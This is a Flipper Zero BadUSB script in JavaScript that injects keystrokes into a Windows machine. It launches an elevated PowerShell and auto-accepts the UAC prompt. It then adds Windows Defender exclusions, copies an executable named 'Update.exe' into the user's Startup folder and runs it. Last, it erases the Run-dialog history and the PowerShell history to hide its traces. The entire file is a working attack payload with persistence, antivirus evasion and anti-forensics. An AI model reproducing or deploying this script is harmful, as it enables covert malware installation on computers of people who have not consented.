// Rename Example.exe to the correct binary name you stored on the Flipper's mass storage
let binary = "Update.exe";
// Create a Mass Storage Image called Update on the Flipper before use
let image = "/ext/apps_data/mass_storage/Update.img";
// Required
let badusb = require("badusb");
let usbdisk = require("usbdisk");
let storage = require("storage");
let localTempFolder = "C:\\Users\\$env:USERNAME\\AppData\\Roaming\\Microsoft\\Windows\\Start' 'Menu\\Programs\\Startup\\"; // local target folder
// Checks for the img on the Flipper
print("Checking for image...");
if (!storage.fileExists(image)) {
    print("Missing Mass Storage image!");
    return;
}
print("Starting HID...");
badusb.setup({ vid: 0xAAAA, pid: 0xBBBB, mfr_name: "Flipper", prod_name: "Zero" });
print("Waiting for USB connection...");
while (!badusb.isConnected()) {
    delay(1000);
}
// Start of the program
badusb.press("GUI", "r"); //Open Run Dialog
delay(500);
badusb.println('powershell -Command "Start-Process powershell -Verb RunAs"'); // Runs Powershell as Admin
delay(500);
badusb.press("ENTER");
delay(3000); // Wait for UAC prompt
badusb.press("ALT", "Y"); // Accept UAC
delay(2000);
print("Sending payload...");
badusb.println("Start-Sleep 6;$DriveLetter = Get-Disk -FriendlyName 'Flipper Mass Storage' | Get-Partition | Get-Volume | Select-Object -ExpandProperty DriveLetter;$drivePath = $DriveLetter + ':';$directoryPath = Join-Path -Path $drivePath -ChildPath $env:COMPUTERNAME-$env:USERNAME;$Bin_Path = $drivePath + '\\' + '" + binary + "';Add-MpPreference -ExclusionPath $drivePath;cd " + localTempFolder + ";Add-MpPreference -ExclusionPath " + localTempFolder + ";Copy-Item -Path $Bin_Path;Start-Process " + binary + ";reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f;Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue;exit");
badusb.press("ENTER");
badusb.quit();
delay(2000);

print("Mounting mass storage...");
usbdisk.start(image);

print("Waiting for eject...");
while (!usbdisk.wasEjected()) {
    delay(1000);
}

usbdisk.stop();
print("Done.");
